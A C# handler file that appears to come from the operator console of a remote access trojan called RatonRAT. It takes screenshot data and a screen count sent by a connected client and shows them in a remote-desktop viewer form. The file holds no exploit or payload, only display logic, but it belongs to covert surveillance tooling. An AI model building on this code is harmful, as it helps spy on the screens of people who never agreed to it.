using Stuff;
using Server.Connection;
using System;
using RatonRAT.ClientForms;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handlers
{
    internal class HandleDesktop
    {
        public void Run(SillyClient SillyClient, Unpack unpacl)
        {
            string formname = "Remote desktop | Client ID: ";
            FormRemote desktopForm = (FormRemote)Application.OpenForms[formname + unpacl.GetAsString("UID")];
            if (desktopForm != null)
            {
                try
                {
                    if (desktopForm.SillyClient == null)
                    {
                        desktopForm.SillyClient = SillyClient;
                        desktopForm.timer1.Start();
                    }
                    desktopForm.Invoke(new MethodInvoker(() =>
                    {
                        lock (desktopForm.OneByOne)
                        {
                            int Screens = unpacl.GetAsInteger("Screens");
                            desktopForm.comboBox1.Items.Clear();

                            if (Screens > 0)
                            {
                                for (int i = 0; i < Screens; i++)
                                {
                                    string screen = "RatonScreen_" + i;
                                    desktopForm.comboBox1.Items.Add(screen);
                                }
                                if (desktopForm.comboBox1.SelectedIndex == -1)
                                {
                                    desktopForm.comboBox1.SelectedIndex = 0;
                                }
                            }
                            else
                            {
                                desktopForm.comboBox1.Items.Add("No screens :(");
                                desktopForm.comboBox1.SelectedIndex = 0;
                            }

                            byte[] desktopImg = unpacl.GetAsByteArray("ImageBytes");
                            if (desktopImg == null || !(desktopImg.Length > 0)) return;
                            Image image = Image.FromStream(new MemoryStream(desktopImg));
                            desktopForm.imageSize = new Point(image.Width, image.Height);
                            desktopForm.FPS += 1;
                            desktopForm.pictureBox1.Image = image;
                        }
                    }));
                }
                catch (System.ObjectDisposedException) { return; }
            }
        }
    }
}
